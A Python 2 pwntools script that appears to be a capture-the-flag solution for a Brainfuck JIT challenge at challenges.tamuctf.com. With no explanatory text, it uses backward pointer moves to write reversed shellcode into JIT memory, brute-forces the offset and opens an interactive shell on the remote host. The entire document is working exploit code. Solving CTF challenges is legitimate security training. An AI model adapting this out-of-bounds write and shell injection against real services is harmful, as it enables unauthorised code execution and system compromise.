#!/usr/bin/env python2

from __future__ import print_function

from pwn import *

JIT_SIZE = 125

context.arch = 'amd64'


def write_code(io, sc, offset=0):
    bf = '<' * offset
    bf += ''.join('<,' for _ in range(len(sc)))
    io.recvuntil('bf$ ')
    io.sendline(bf)
    io.sendline(''.join(reversed(sc)))


def read_code(io, size):
    bf = ''.join('<.' for _ in range(size))
    io.recvuntil('bf$ ')
    io.sendline(bf)
    return io.recv(size)


def main():
    for i in range(0x40):
        io = remote('challenges.tamuctf.com', 31337)

        sc = asm(shellcraft.amd64.linux.sh())
        log.info('Shellcode is %i bytes long' % len(sc))

        write_code(io, sc, offset=i)
        io.interactive()

    # read_code(io, JIT_SIZE)


if __name__ == '__main__':
    main()
